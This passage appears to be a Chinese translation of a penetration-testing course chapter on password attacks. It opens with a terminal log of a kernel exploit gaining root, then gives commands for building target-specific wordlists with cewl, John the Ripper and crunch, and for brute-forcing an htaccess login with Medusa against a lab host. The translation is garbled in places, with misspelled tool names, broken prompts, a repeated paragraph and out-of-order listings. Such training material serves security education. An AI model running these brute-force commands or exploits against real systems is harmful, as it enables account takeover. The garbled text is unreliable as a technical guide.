
File Edit View Search Terminal Help
n00b@victim:~$ Desktop
total 60k
drwx-xr-x 2 n00b n00b 4,0K Jan 27 00:57
drwx-xr-x 15 n00b n00b 4,0K Jan 27 04:12
--rw-r--r-- 1 n00b n00b 24K jan 27 00:56 43418.6
--rw-r--r-- 1 n00b n00b 20K jan 27 00:57 evil
n00b@victim:~$ Desktop whoami
n00b
n00b@victim:~$ ./evil
[starting]
- checking kernel and kernel versions
- checking kernel '4.8.0-58-generic' detected
- done works good
- checking SMEP and SMAP
- done good
- setting up namespace sandbox
- done namespace set up getting kernel addr
- KASLR bypass enabled, ffffffae00000
- done kernel text: ffffffa6e5ad520
- complete
- prepared kernel: ffffffa6ea6310
- SMEP bypass enabled, mapping fake stack
- done, fake stack mapped
- executing payload ffffffa6e17c555
- done
- checking if we got root
al.got got r0
root@victim:/home/n00b/Desktop# whoami
root
root@victim:/home/n00b/Desktop#

# 19. 攻击

密码是用户认证最基本的形式，推此，密码攻击的目标是访问用户账户或服务。在某些情况下，一旦获得了明文密码，我们可以利用哈希传递攻击（Pass-the-Hash attacks），这允许我们仅使用哈希进行身份验证。在本模块中，我们将更详细地讨论这些技术。

## 19.1 字典列表

字典列表有时被称为字典文件，是包含用于密码测试程序的词汇的简单文本文件。在考虑字典攻击时，精确性通常比覆盖范围更重要，创建一个精简的字典列表比创建一个庞大且通用的列表更重要。许多字典列表是基于共同的主题构建的，例如流行文化、特定行业或地理区域。

### 19.1.1 标准字典列表

我们可以通过添加特定于目标机构的词汇和短语来增加我们字典列表的有效性。

例如，MegaCorp One，一家处理事纳米技术的公司。公司网站 www.megacorp.com 列出了该公司销售的各种产品，包括 Nanobot。在一次假设的评估中，我们识别出一个低级密码 Nanobot93。假设这可能是该公司的常用密码格式，我们希望创建一个自定义字典列表，以识别具有类似模式的其他密码，或许可以使用其他产品名称。

我们可以浏览网站并将许多常用术语和产品名称导入我们的自定义字典列表，或者使用像 `cwl64` 这样的工具来为我们完成繁重的工作。如 `-help` 输出所示，我们的工具可以通过指定某些选项进行配置，但我们将重点关注几个关键领域。

例如，以下命令会抓取 www.megacorpone.com 网站，定位长度至少为六个字符的单词（-m 6），并将字典列表（-w）写入自定义自定义文件（megacorp-cewl.txt）：

```bash
kali@kali:~$ cwl www.megacorpone.com -m 6 -w megacorp-cewl.txt
kali@kali:~$ wc -l megacorp-cewl.txt
312
kali@kali:$ grep Nano megacorp-cewl.txt Nanomite Nanoprobe Nanoprocessors NanoTimes Nan
```

**列表 591 - 使用 cwl 创建每日文件**

上面的列表显示 `cwl` 定位了几个产品的名称，包括 Nanobot。我们应该考虑其他产品名称也可能被用作密码的可能性。

然而，这些单词本身将是极弱的密码，并且不符合密码强制规则。这类规则通常要求使用大小写字母、数字，可能还包括特殊字符。根据我们发现的密码 (Nanobot93)，我们可以认为 megacorpone 的密码强制策略要求密码中至少包含两个数字，并进一步规定（尽管可能不太）数字必须位于密码末尾。

554 (Diginja, 2017), http://www.diginja.org/projects/cewl.php

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 573

相反，使用一个更强大的工具 The Ripper (JTR)，这是一种具有多种功能的破解器，包括生成自定义字典列表和应用变异的能力。

**列表 592 - 在 John the Ripper 文件中创建变异规则**

John the Ripper 的规则语法非常广泛且强大，但超出了本模块的范围。欲了解更多信息，请花时间查看规则文档。

规则已添加到配置文件，我们可以对字典列表进行变异，该列表包含 312 条目。

556 (Openwall, 2018), http://www.openwall.com/john/

556 (Solar Designer, 2017), http://www.openwall.com/john/doc/RULES.html

使用 Kali Linux 2.0 进行渗透测试

为了便于这个简单的演示，我们假设 Megacorp One 的策略规定密码以两位数字结尾。

为了创建符合此要求的密码，我们可以编写一个 Bash 脚本。然而，我们将继续基于对密码策略的假设，在 JTR 配置文件 (/etc/john/john.conf) 中添加一条规则，对我们的字典列表进行变异，在每个密码后附加两个数字。为了做到这一点，我们必须找到定义列表变异规则的 [List.Rules:Wordlist] 段并添加新规则。在本例中，我们将在字典列表中的每个单词后添加从（双倍）零到九十九的两位数字序列。

我们将以 $ 字符开始此规则，它告诉 John 在字典列表中的原始单词后添加一个字符。接下来，我们指定想要添加的字符类型，在我们的情况下，我们想要零到九之间的任何数字 (0-9)。最后，为了添加两位数字，我们只需重复 `$[0-9]`。最终规则如列表 592 所示。

```bash
kali@kali:$ sudo nano /etc/john/john.conf ...
# Wordlist rules [List.Rules:Wordlist]
# 按原样尝试单词
:
# 将每个字母数字单词转换为小写
-cs Q
# 将每个字母数字单词转换为大写
-c (a>2)!cX Q
# 将字母单词小写并复数化
# 尝试拆分密码的后部分
-s
-s-c x_, M1 Q
# 在每个密码末尾添加两个数字 $[0-9]$[0-9]\...
```

为此，我们将调用 `john` 并指定字典文件 (`--wordlist=megacorp-cewl.txt`)，激活配置文件中的规则 (`--rules`)，将结果输出到标准输出 (`--stdout`)，并重定向到名为 mutated.txt 的文件。

```bash
kali@kali$: john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
Press 'q' or Ctrl-C to abort, almost any key for status
6646p 0:00:00 100.00% (2018-03-01 15:41) 663514p/s chocolate99
```

```bash
kali@kali$: grep Nano mutated.txt
Nanobot90
Nanobot91
Nanobot92
Nanobot93
Nanobot94
Nanobot95
Nanobot96
```

上面的列表显示 `cwl` 定位了几个产品的名称，包括 Nanobot。我们应该考虑其他产品名称也可能被用作密码的可能性。

然而，这些单词本身将是极弱的密码，并且不符合密码强制规则。这类规则通常要求使用大小写字母、数字，可能还包括特殊字符。

```bash
kali@kali:~$ head crunch.txt 0000
0001
0002

0003
0004
0005
0006
0007
0008
```

列表 598 - 使用 crunch 使用特定字符集生成密码

注意，文件输出的大小明显小于上一个用例，这主要是由于密码长度较短以及字符集受到限制所致。然而，该字典文件令人印象深刻，包含超过 1700 万个密码：

列表 599 - 统计生成的密码数量

此外，我们可以根据预定义的字符集生成密码，例如在 `/usr/share/crunch/charset.lst` 中定义的那些。例如，我们可以指定字符集文件的路径（`-f /usr/share/crunch/charset.lst`）并选择混合字母集 `mixalpha`，它包含了所有的小写和大大写字母：

列表 600 - 生成大小写字母密码列表

尽管此特定命令生成了一个巨大的 131 GB 字典文件，但它提供了相当令人印象深刻的密码覆盖率。

花时间研究 JTR 和 crunch，并思考如何最有效地使用每种工具。正如我们在下一节中将发现的，我们需要避免依赖大规模且通用字典的诱惑，因为它们可能会对我们客户的生产环境产生不利影响。

### 19.1.2 练习

（此练习不需要报告）

- 1. 在你的 Kali 系统上添加一个用户，并为该账户指定一个包含大小写字母、数字和特殊字符的复杂密码。结合使用 `crunch` 规则模式和预定义的字符集，以生成一个包含该用户密码的字典。

```bash
kali@kali:~$ wc -l crunch.txt
17891328 crunch.txt
```

```bash
kali@kali:~$ crunch 4 6 -f/usr/share/crunch/charset.lst mixalpha -o crunch.txt Crunch 将现在生成以下数据
data: 140712049920 bytes 134193 MB

0 TB
0 PB
Crunch 将现在生成以下数量的行：20158125312
```

## 19.2 常见网络服务攻击方法

现在我们已经理解了如何为各种情况创建有效的字典，我们可以讨论如何将它们用于针对常见网络服务的密码攻击。

> 请记住，针对网络服务的密码攻击具有很强的存在性，并且在某些情况下是危险的。多次失败登录尝试通常会在目标系统上生成日志和警告，并可能在预定义的的失败登录次数后锁定账户。这在渗透测试期间可能是灾难性的，导致用户无法访问生产系统，直到管理员重新启用账户。在盲目运行基于网络的暴力破解攻击之前，请记住这一点。

一旦我们权衡了风险并考虑了目标网络的状况，就可以采取几个步骤来提高密码测试的效率。

取决于协议和密码破解工具，我们可以增加登录线程的数量来提高攻击速度。然而，在某些情况下（如 RDP 和 SMB），由于协议限制，可能无法增加线程，我们的优化尝试可能会减慢进程。

此外，值得注意的是，像 RDP 等协议的认证过程比 HTTP 更耗时。然而，虽然攻击 RDP 协议可能比攻击 HTTP 需要更多时间，但成功攻击 RDP 往往会带来更大的回报。网络服务密码攻击背后的隐藏艺术是在发起攻击之前，仔细且智能地选择适当的目标、用户列表和密码文件。

要成功攻击网络服务（如 HTTP、SSH、VNC、FTP、SNMP 和 POP3）上的密码，我们不仅必须匹配目标用户名和密码，还要遵守认证过程中涉及的协议。

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_668_0.png)

幸运的是、`THC-Hydra`、`Medusa`、`Crowbar` 和 `spray` 等流行工具可以为我们处理这些认证请求。

在本节中，我们将检查这些工具，并权衡它们有效的协议和服务处理能力。后续段落提到的工具大多具有相似的能力和速度。使用“正确”工具通常取决于首选的语法和输出格式。这只能通过在测试环境中对每个工具进行实验并学习每个工具的优点、缺点和独特性来确定。

> 558 (THC Hydra, 2019), https://github.com/vanhauser-thc-hydra (Foofus.Net, 2015), http://h.foofus.net/?page_id=51

> 559 (Galkan, 2017), https://github.com/galkan/crowbar

> 560 (SpiderLabs, 2019), https://github.com/SpiderLabs/Splay

### 19.2.1 使用 Medusa 进行 HTTP htaccess 攻击

根据作者的描述，Medusa 旨在作为一个“快速、大规模并行、模块化的登录暴力破解工具”。我们将使用 Medusa 尝试访问受 htaccess 保护的网络目录。首先，我们将设置目标，即安装在 Windows 客户端上的 Apache Web 服务器，尝试访问该服务器上受 htaccess 保护的文件夹 `/admin`。本示例的字典选择为 `/usr/share/wordlists/rockyou.txt`，我们必须先用 `gunzip` 对其解压。

接下来，我们将启动 medusa 对目标主机（`-h 10.1.0.22`）受 htaccess 保护的 URL 发起攻击。我们将使用字典中的密码（`-P rockyou.txt`）攻击 admin 用户（`-u admin`），当然，使用 HTTP 认证方案（`-M http`）：

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_668_0.png)

```bash
kali@kali~$ sudo gunzip /usr/share/wordlists/rockyou.txt
```

```bash
kali@kali:~$ medusa -h 10.1.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http
Medusa v2.2
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin 1235 (1 of 1491)
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin 2345 (2 of 1491)
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin 45678 (3 of 1491)
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin password: poor (4 of 1491)
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin password: iloveyou (5 of 1491)
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin password: samsung (6 of 1491)
ACCOUNT CHECK: [http] Host: 10.1.0.22 User: admin password: (6 of 1491)
ACCOUNT FOUND: [http] Host: 10.1.0.22 User: admin freedom [SUCCESS]
```

## 列表 602 - 使用 Medusa 进行 HTTP htpasswd 攻击

在这种情况下，Medusa 发现了密码“freedom”。Medusa 有许多额外的选项和设置，如列表 603 中的帮助输出所示：

```bash
kali@kali:~ ALERT: Host information must be supplied.
Syntax: Medusa [-h -H file] [-u username -U file] [-p password -P file] [-C file] -M module [options]
-h [TEXT] -FILE -u [TEXT]
Target hostname or IP address
File containing hostnames or IP addresses
Username to target
```

## 列表 603 - Medusa 选项和模块

该工具可以与多种网络协议交互，可以通过列表 604 显示的 -d 选项显示。

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_670_0.png)
